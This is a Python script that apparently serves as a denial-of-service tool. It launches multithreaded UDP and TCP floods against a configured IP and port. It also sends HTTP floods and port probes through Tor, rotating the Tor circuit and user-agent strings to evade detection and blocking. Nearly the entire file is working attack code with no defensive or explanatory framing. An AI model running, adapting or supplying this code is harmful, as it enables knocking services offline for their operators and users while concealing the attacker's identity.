from stem import Signal
from stem.control import Controller
from fake_useragent import UserAgent
from queue import Queue
import socket
import requests
import threading
import json
import random

controller = None
queue = Queue()
active_ports = []
IP = '00.000.000.00'
PORT = 80
ITERATIONS = 100
THREADS = 100
IS_UDP = True


def _create_target(_is_https, _url):
    return f'{("https" if _is_https else "http")}://{_url}'


def _run_threading(_count, _worker):
    import threading
    thread_list = []

    for t in range(_count):
        thread = threading.Thread(target=_worker)
        thread_list.append(thread)

    for thread in thread_list:
        thread.start()

    for thread in thread_list:
        thread.join()


def flood_process(_target, _iterations):

    with open('credentials.json', 'r', encoding='utf-8') as f:
        password = json.load(f)["password"]

    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password=password)

        for _ in range(_iterations):
            if controller.is_newnym_available():
                controller.signal(Signal.NEWNYM)

            proxies = {
                'http': 'socks5://127.0.0.1:9050',
                'https': 'socks5://127.0.0.1:9050'
            }

            user_agent = UserAgent().random
            headers = {
                'User-Agent': user_agent,
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
            }

            try:
                requests.get(_target, proxies=proxies, headers=headers)
            except:
                pass


def flood_udp_worker():
    data = random.randbytes(1024)
    while True:
        # if controller.is_newnym_available():
        #     controller.signal(Signal.NEWNYM)
        # UDP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            addr = (IP, PORT)
            while True:
                s.sendto(data, addr)
        except:
            s.close()


def flood_tcp_worker():
    data = random.randbytes(16)
    while True:
        # if controller.is_newnym_available():
        #     controller.signal(Signal.NEWNYM)
        # TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((IP, PORT))
            while True:
                s.send(data)
        except:
            s.close()


def check_ports_worker():
    while not queue.empty():
        obj = queue.get()
        while not obj['controller'].is_newnym_available():
            pass

        obj['controller'].signal(Signal.NEWNYM)

        proxies = {
            'http': 'socks5://127.0.0.1:9050',
            'https': 'socks5://127.0.0.1:9050'
        }

        user_agent = UserAgent().random
        headers = {
            'User-Agent': user_agent,
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
        }

        thread_identifier = threading.get_ident()

        try:
            requests.get(f'{obj["target"]}:{obj["port"]}', proxies=proxies, headers=headers)
            active_ports.append(obj["port"])
            # print(f'ON  {obj["port"]}\t\t{thread_identifier}')
        except:
            # print(f'OFF {obj["port"]}\t\t{thread_identifier}')
            pass


def check_ports(_target, _ports):

    with open('credentials.json', 'r', encoding='utf-8') as f:
        password = json.load(f)["password"]

    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password=password)
        for port in _ports:
            queue.put({
                'port': port,
                'controller': controller,
                'target': _target,
            })
        _run_threading(THREADS, check_ports_worker)

    print(active_ports)


if __name__ == '__main__':
    # flood
    with open('credentials.json', 'r', encoding='utf-8') as f:
        password = json.load(f)["password"]

    controller = Controller.from_port(port=9051)
    controller.authenticate(password=password)
    controller.signal(Signal.NEWNYM)
    _run_threading(THREADS, flood_udp_worker if IS_UDP else flood_tcp_worker)

    # target = _create_target(True, 'www.........')
    # check_ports(target, range(1024))
